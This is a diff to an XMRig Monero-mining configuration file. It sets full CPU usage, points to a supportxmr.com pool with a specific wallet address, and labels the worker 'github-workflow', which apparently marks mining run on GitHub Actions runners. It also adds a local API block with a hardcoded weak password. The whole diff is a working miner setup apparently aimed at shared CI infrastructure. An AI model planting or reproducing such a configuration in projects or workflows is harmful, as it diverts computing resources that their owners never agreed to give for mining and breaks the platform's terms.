@@ -1,15 +1,60 @@
 {
     "autosave": true,
-    "cpu": true,
+    "donate-level": 1,
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 100,
+        "priority": 2,
+        "rx": [0, 1, 2, 3],
+        "asm": true,
+        "argon2": [],
+        "cn": [],
+        "cn-lite": [],
+        "cn-pico": [],
+        "cn-heavy": [],
+        "ghostrider": [],
+        "rx/wow": [],
+        "astrobwt": [],
+        "astrobwt-avx2": []
+    },
     "opencl": false,
     "cuda": false,
     "pools": [
         {
             "url": "pool.supportxmr.com:443",
             "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-            "pass": "git",
+            "pass": "github-workflow",
             "keepalive": true,
-            "tls": true
+            "tls": true,
+            "variant": 1
         }
-    ]
+    ],
+    "api": {
+        "id": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true,
+        "access-password": "github123",
+        "host": "127.0.0.1",
+        "port": 8080
+    },
+    "log-file": "/tmp/xmrig.log",
+    "print-time": 30,
+    "health-print-time": 30,
+    "retries": 3,
+    "retry-pause": 3,
+    "randomx": {
+        "init": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "hwloc": {
+        "enabled": true
+    },
+    "background": false,
+    "max-cpu-usage": 100
 }
